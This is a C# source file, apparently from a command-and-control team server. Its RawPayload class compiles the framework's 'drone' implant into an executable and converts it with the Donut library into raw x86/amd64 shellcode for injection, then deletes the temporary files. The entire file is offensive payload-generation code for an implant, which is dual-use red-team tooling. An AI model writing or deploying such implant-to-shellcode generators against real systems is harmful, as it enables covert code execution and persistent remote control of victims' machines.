using System;
using System.IO;
using System.Threading.Tasks;

using Donut;
using Donut.Structs;

namespace TeamServer.Models
{
    public class RawPayload : Payload
    {
        private string _tempDroneFile;
        private string _tempShellcodeFile;
        
        public override async Task Generate()
        {
            var drone = await GetDroneModuleDef();
            drone.ConvertModuleToExe();

            await using var ms = new MemoryStream();
            drone.Write(ms);
            var droneBytes = ms.ToArray();

            _tempDroneFile = Path.GetTempFileName().Replace(".tmp", ".exe");
            await File.WriteAllBytesAsync(_tempDroneFile, droneBytes);

            _tempShellcodeFile = Path.GetTempFileName().Replace(".tmp", ".bin");

            var config = new DonutConfig
            {
                Arch = 3, // x86+amd64
                Bypass = 1, // none
                Domain = Guid.NewGuid().ConvertToShortGuid(),
                InputFile = _tempDroneFile,
                Payload = _tempShellcodeFile
            };

            var result = Generator.Donut_Create(ref config);

            if (result != Constants.DONUT_ERROR_SUCCESS)
            {
                DeleteTempFiles();
                throw new Exception("Error generating shellcode");
            }
                

            Bytes = await File.ReadAllBytesAsync(_tempShellcodeFile);
            DeleteTempFiles();
        }

        private void DeleteTempFiles()
        {
            try { File.Delete(_tempShellcodeFile); } catch { /* ignore */ }
            try { File.Delete(_tempDroneFile); } catch { /* ignore */ }
            try { File.Delete($"{_tempShellcodeFile}.b64"); } catch { /* ignore */ }
        }
    }
}